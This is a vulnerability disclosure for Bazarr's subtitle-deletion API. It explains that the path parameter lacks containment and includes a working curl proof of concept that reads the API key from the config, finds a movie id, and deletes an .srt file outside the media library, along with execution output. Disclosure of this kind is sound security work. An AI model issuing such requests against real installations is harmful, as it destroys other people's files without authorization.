# Bazarr: arbitrary file deletion via DELETE /api/movies/subtitles path parameter

## Description

`DELETE /api/movies/subtitles` (and the episodes variant) in `bazarr/api/movies/movies_subtitles.py` (L100-140) takes a `path` parameter for the subtitle file to delete, resolves it through `path_mappings.path_replace_reverse_movie()`, and passes it to `delete_subtitles()` in `bazarr/subtitles/tools/delete.py` (L25+). The only check is a file-extension gate (`SUBTITLE_EXTENSIONS`); there is **no path containment** — the path can point to any `.srt`/`.ass`/`.vtt` etc. file anywhere on the filesystem.

The `@authenticate` decorator requires the API key; `radarrid` must reference an existing movie in the database (obtainable via `GET /api/movies`), which any real deployment has.

## Impact

An attacker with the API key deletes any subtitle-extension file at any absolute path writable by the service account — outside the media library, including other users' data, configuration backups with matching extensions, or any `.srt` file on the system.

## PoC

```bash
# Prerequisite: bazarr running on :6767, API key, at least one movie in the database
KEY=$(python3 -c "import yaml; print(yaml.safe_load(open('data/config/config.yaml'))['auth']['apikey'])")
# find any existing radarrId:
curl "http://127.0.0.1:6767/api/movies?apikey=$KEY" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'][0]['radarrId'])"

# victim file outside the media library:
printf '3\n00:00:09,000 --> 00:00:10,000\nSECOND-DELETE-TEST\n' > /tmp/bazarr_victim/doomed2.srt

curl -X DELETE "http://127.0.0.1:6767/api/movies/subtitles?radarrid=999&language=en&forced=False&hi=False&path=/tmp/bazarr_victim/doomed2.srt&apikey=$KEY"
```

## Execution result

```
$ curl -X DELETE ".../api/movies/subtitles?radarrid=999&...&path=/tmp/bazarr_victim/doomed3.srt&apikey=$KEY"
[code 204]

$ ls /tmp/bazarr_victim/
doomed.srt doomed2.srt keep.txt secret.srt      # doomed3.srt is GONE

# control: non-subtitle extension (keep.txt) -> [code 404], file survives
```
